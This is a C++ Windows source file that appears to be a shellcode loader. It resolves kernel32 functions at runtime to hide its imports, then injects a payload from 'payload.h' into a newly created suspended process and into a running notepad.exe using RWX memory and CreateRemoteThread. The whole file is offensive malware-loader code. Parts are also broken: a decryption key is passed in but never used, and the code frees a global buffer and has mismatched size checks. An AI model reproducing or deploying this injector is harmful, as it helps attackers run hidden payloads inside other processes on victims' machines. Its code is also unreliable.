#include <iostream>
#include "safeApi.h"
#include "safeToolhelp.h"
#include <windows.h>
#include "payload.h"

DWORD GetProcessIdByName(LPCTSTR lpszProcessName)
{
    if (!SafeCreateProcessSnapshot())
        return 0;
    SAFE_PROCESSENTRY32 entry;
    if (!SafeProcess32First(&entry))
        return 0;
    do {
        if (lstrcmpi(lpszProcessName, entry.imageName) == 0)
            return entry.pid;
    } while (SafeProcess32Next(&entry));
    return 0;
}



bool InjectShellcodeToNewSuspendedProcess(const wchar_t* exePath, const unsigned char* encrypted_shellcode, size_t shellcode_len, unsigned char key) {
    // 挂起创建进程并远程线程注入
    typedef BOOL(WINAPI* PFN_CreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
    typedef LPVOID(WINAPI* PFN_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL(WINAPI* PFN_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    typedef HANDLE(WINAPI* PFN_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    typedef DWORD(WINAPI* PFN_ResumeThread)(HANDLE);
    typedef BOOL(WINAPI* PFN_TerminateProcess)(HANDLE, UINT);
    typedef BOOL(WINAPI* PFN_CloseHandle)(HANDLE);

    PFN_CreateProcessW pCreateProcessW = (PFN_CreateProcessW)SafeGetProcAddress(L"kernel32.dll", "CreateProcessW");
    PFN_VirtualAllocEx pVirtualAllocEx = (PFN_VirtualAllocEx)SafeGetProcAddress(L"kernel32.dll", "VirtualAllocEx");
    PFN_WriteProcessMemory pWriteProcessMemory = (PFN_WriteProcessMemory)SafeGetProcAddress(L"kernel32.dll", "WriteProcessMemory");
    PFN_CreateRemoteThread pCreateRemoteThread = (PFN_CreateRemoteThread)SafeGetProcAddress(L"kernel32.dll", "CreateRemoteThread");
    PFN_ResumeThread pResumeThread = (PFN_ResumeThread)SafeGetProcAddress(L"kernel32.dll", "ResumeThread");
    PFN_TerminateProcess pTerminateProcess = (PFN_TerminateProcess)SafeGetProcAddress(L"kernel32.dll", "TerminateProcess");
    PFN_CloseHandle pCloseHandle = (PFN_CloseHandle)SafeGetProcAddress(L"kernel32.dll", "CloseHandle");

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    if (!pCreateProcessW(exePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return false;
    }
    LPVOID remoteMem = pVirtualAllocEx(pi.hProcess, NULL, shellcode_len+1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        pTerminateProcess(pi.hProcess, 0);
        pCloseHandle(pi.hProcess);
        pCloseHandle(pi.hThread);
        delete[] shellcode;
        return false;
    }
    SIZE_T written = 0;
    if (!pWriteProcessMemory(pi.hProcess, remoteMem, shellcode, shellcode_len+1, &written) || written != shellcode_len) {
        pTerminateProcess(pi.hProcess, 0);
        pCloseHandle(pi.hProcess);
        pCloseHandle(pi.hThread);
        delete[] shellcode;
        return false;
    }
    HANDLE hRemoteThread = pCreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hRemoteThread) {
        pTerminateProcess(pi.hProcess, 0);
        pCloseHandle(pi.hProcess);
        pCloseHandle(pi.hThread);
        delete[] shellcode;
        return false;
    }
    pResumeThread(pi.hThread);
    pCloseHandle(hRemoteThread);
    pCloseHandle(pi.hProcess);
    pCloseHandle(pi.hThread);
    delete[] shellcode;
    return true;
}

int main()
{
    typedef HANDLE (WINAPI *PFN_OpenProcess)(DWORD, BOOL, DWORD);
    typedef LPVOID (WINAPI *PFN_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL (WINAPI *PFN_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    typedef HANDLE (WINAPI *PFN_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

    PFN_OpenProcess pOpenProcess = (PFN_OpenProcess)SafeGetProcAddress(L"kernel32.dll", "OpenProcess");
    PFN_VirtualAllocEx pVirtualAllocEx = (PFN_VirtualAllocEx)SafeGetProcAddress(L"kernel32.dll", "VirtualAllocEx");
    PFN_WriteProcessMemory pWriteProcessMemory = (PFN_WriteProcessMemory)SafeGetProcAddress(L"kernel32.dll", "WriteProcessMemory");
    PFN_CreateRemoteThread pCreateRemoteThread = (PFN_CreateRemoteThread)SafeGetProcAddress(L"kernel32.dll", "CreateRemoteThread");

    DWORD pid = GetProcessIdByName(L"notepad.exe");
    HANDLE hProcess = pOpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    LPVOID lpBaseAddress = pVirtualAllocEx(hProcess, 0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    // 假设shellcode已定义并解密
    pWriteProcessMemory(hProcess, lpBaseAddress, shellcode, sizeof(shellcode), NULL);
    pCreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, 0, 0, 0);
}
